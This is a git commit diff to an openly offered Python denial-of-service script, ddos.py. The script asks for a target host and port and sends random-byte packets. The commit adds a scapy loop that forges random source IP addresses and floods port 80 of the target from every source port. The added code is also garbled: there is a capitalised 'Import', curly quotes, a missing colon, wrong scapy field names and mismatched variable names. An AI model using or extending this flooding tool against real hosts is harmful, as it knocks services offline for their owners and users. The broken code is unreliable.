2d5acb31727ccfb6d213ca40c0d49d21a1245f8a
Fabri15544 <51274314+Fabri15544@users.noreply.github.com>
2020-01-17 21:49:23 -0300

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,5 +1,7 @@
 #!/usr/bin/env python
 # coding=utf-8
+Import random
+from scapy.all import *
 import os, sys
 import time
 import  socket
@@ -7,7 +9,23 @@ import random
 #host && Port
 target_host = raw_input("HOST :")
 target_port = input("Port :")
+i = 1
 packetes = input("Bytes :")
+#Multiples IPS
+while True:
+   a = str(random.randint(1,254))
+   b = str(random.randint(1,254))
+   c = str(random.randint(1,254))
+   d = str(random.randint(1,254))
+   dot = “.”
+   Source_ip = a + dot + b + dot + c + dot + d
+   
+   for source_port in range(1, 65535)
+      IP1 = IP(source_IP = source_IP, destination = target_IP)
+      TCP1 = TCP(srcport = source_port, dstport = 80)
+      pkt = IP1 / TCP1
+      send(pkt,inter = .999)
+      
 #packet
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(packetes)
@@ -19,5 +37,7 @@ sent = 1
 pysendfile = 0
 while True:
 
- print(bytes, target_host, target_port)
+ print(bytes, target_host, target_port, i)
+ 
+ i = i + 1
             
